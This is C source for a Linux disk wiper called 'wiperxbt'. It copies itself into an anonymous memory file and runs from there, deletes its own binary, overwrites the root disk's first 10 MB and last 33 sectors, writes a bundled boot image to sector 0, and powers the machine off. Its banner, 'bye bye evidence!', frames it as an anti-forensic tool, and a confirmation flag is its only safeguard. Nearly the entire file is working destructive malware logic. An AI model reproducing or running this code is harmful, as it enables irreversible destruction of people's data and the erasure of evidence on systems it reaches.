void print_usage(const char *prog_name) {
  printf("Usage: %s [OPTIONS]\n\n", prog_name);
  printf("Options:\n");
  printf("  --%s    Authorize execution (DANGER)\n", CONFIRM_FLAG);
  printf("  -h, --help         Display this help message\n");
}

char *GetRootPhysicalDevice() {
  struct stat st;
  if (stat("/", &st) != 0) {
    return NULL;
  }
  char sys_path[256];
  snprintf(sys_path, sizeof(sys_path), "/sys/dev/block/%u:%u", major(st.st_dev),
           minor(st.st_dev));
  char real_path[1024];
  ssize_t len = readlink(sys_path, real_path, sizeof(real_path) - 1);
  if (len == -1) {
    return NULL;
  }
  real_path[len] = '\0';
  char *block_ptr = strstr(real_path, "/block/");
  if (!block_ptr)
    return NULL;
  block_ptr += 7;
  char *slash_ptr = strchr(block_ptr, '/');
  if (slash_ptr)
    *slash_ptr = '\0';
  char *dev_path = malloc(256);
  if (!dev_path)
    return NULL;
  snprintf(dev_path, 256, "/dev/%s", block_ptr);
  return dev_path;
}

int migratetoRam(int argc, char *const argv[]) {
  extern char **environ;
  char *path;
  char buf[1024];
  ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
  if (len == -1)
    return -1;
  buf[len] = '\0';
  asprintf(&path, "%s", buf);

  char **args = calloc(argc + 3, sizeof(char *));
  args[0] = "wiperxbt";
  args[1] = "ram";
  args[2] = path;
  for (int i = 1; i < argc; i++) {
    args[i + 2] = (char *)argv[i];
  }

  int fd_ram = memfd_create("unfed", MFD_ALLOW_SEALING);
  int buf_fd = open(buf, O_RDONLY);
  struct stat st;
  fstat(buf_fd, &st);
  sendfile(fd_ram, buf_fd, NULL, st.st_size);
  fcntl(fd_ram, F_ADD_SEALS,
        F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE | F_SEAL_SEAL);
  close(buf_fd);
  fexecve(fd_ram, args, environ);
  return 0;
}

int main(int argc, char *argv[]) {
  char exepath[1024];
  ssize_t len = readlink("/proc/self/exe", exepath, sizeof(exepath));
  if (len != -1)
    exepath[len] = '\0';

  bool is_ram_execution = (argc > 1 && strcmp(argv[1], "ram") == 0 &&
                           strstr(exepath, "memfd:unfed") != NULL);

  if (!is_ram_execution) {
    migratetoRam(argc, argv);
    return 0;
  }

  int user_argc = argc - 2;
  char **user_argv = &argv[2];
  user_argv[0] = argv[0];

  bool confirm_force = false;

  static struct option long_options[] = {{CONFIRM_FLAG, no_argument, 0, 1000},
                                         {"help", no_argument, 0, 'h'},
                                         {0, 0, 0, 0}};

  int opt;
  int option_index = 0;
  optind = 1;

  while ((opt = getopt_long(user_argc, user_argv, "h", long_options,
                            &option_index)) != -1) {
    switch (opt) {
    case 1000:
      confirm_force = true;
      break;
    case 'h':
    default:
      print_usage(user_argv[0]);
      return 0;
    }
  }

  if (geteuid() != 0) {
    fprintf(stderr, "Need to run as root. Try again with sudo.\n");
    return 1;
  }

  if (!confirm_force) {
    printf("Running from memory (memfd:unfed) - looks good.\n");
    printf("Stopped here as a safety measure. Pass '--%s' to actually run.\n",
           CONFIRM_FLAG);
    print_usage(user_argv[0]);
    return 1;
  }
  printf("##############################################\n"
         "###   Who knows what you had on here...   ###\n"
         "###           bye bye evidence!           ###\n"
         "##############################################\n");

  printf("Removing binary from disk: %s\n", argv[2]);
  unlink(argv[2]);

  char *rootpath = GetRootPhysicalDevice();
  if (!rootpath) {
    fprintf(stderr, "Couldn't find the root block device. Bailing out.\n");
    return 1;
  }

  printf("Going after: %s\n", rootpath);
  int fd = open(rootpath, O_RDWR);
  if (fd < 0) {
    perror("Couldn't open device");
    free(rootpath);
    return 1;
  }

  printf("Wiping headers...");
  fflush(stdout);
  char *junk = calloc(1, 1024 * 1024);
  for (int i = 0; i < 10; i++) {
    write(fd, junk, 1024 * 1024);
  }

  off_t disk_end = lseek(fd, -33 * 512, SEEK_END);
  if (disk_end != (off_t)-1) {
    write(fd, junk, 33 * 512);
  }
  free(junk);

  printf(" done.\nDropping bootloader into sector 0...");
  fflush(stdout);
  lseek(fd, 0, SEEK_SET);
  write(fd, boot_bin, boot_bin_len);
  fsync(fd);
  close(fd);
  free(rootpath);

  printf(" done.\nFlushing and rebooting. See you on the other side.\n");
  sync();
  reboot(LINUX_REBOOT_CMD_POWER_OFF);

  return 0;
}
